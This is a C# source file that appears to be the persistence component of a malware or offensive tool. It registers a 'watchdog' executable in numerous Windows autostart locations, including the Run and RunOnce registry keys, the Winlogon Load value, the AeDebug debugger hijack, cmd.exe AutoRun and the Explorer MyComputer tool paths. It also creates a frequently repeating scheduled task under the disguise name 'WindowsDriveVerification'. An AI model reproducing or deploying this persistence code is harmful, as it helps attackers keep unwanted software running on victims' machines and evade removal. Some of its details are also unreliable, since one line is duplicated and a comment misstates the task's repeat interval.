using System;
using System.Diagnostics;

namespace Persistence{
    public class Persistence{

        public static void runAllTechniques()
        {
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath); // Run Keys on startup
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "Run", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Run", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath);



            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug\", "Debugger", Config.PrimaryWatchdogFullPath); //relies on application crash
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\", "Debugger", Config.PrimaryWatchdogFullPath); //relies on application crash

            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\", "AutoRun", Config.PrimaryWatchdogFullPath); //Runs when cmd.exe starts


            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Config.PrimaryWatchdogFullPath); //These three are Windows background processes
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "cleanuppath", Config.PrimaryWatchdogFullPath);
            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "DefragPath", Config.PrimaryWatchdogFullPath);


            string taskName = "WindowsDriveVerification";

            // Check if the task exists
            if (!TaskExists(taskName))
            {
                // Create the task if it doesn't exist
                CreateScheduledTask(taskName, Config.PrimaryWatchdogFullPath, 30); // Runs every 30 seconds
                Console.WriteLine($"Scheduled task '{taskName}' created successfully.");
            }
            else
            {
                Console.WriteLine($"Scheduled task '{taskName}' already exists.");
            }

        }


        static bool TaskExists(string taskName)
        {
            Process process = new Process();
            process.StartInfo.FileName = "schtasks";
            process.StartInfo.Arguments = $"/Query /TN \"{taskName}\"";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output.Contains(taskName);
        }

        // Function to create a scheduled task
        static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
        {
            // Create the schtasks command to run every few seconds
            string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds}";

            Process process = new Process();
            process.StartInfo.FileName = "schtasks";
            process.StartInfo.Arguments = command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            process.WaitForExit();
        }
    }
}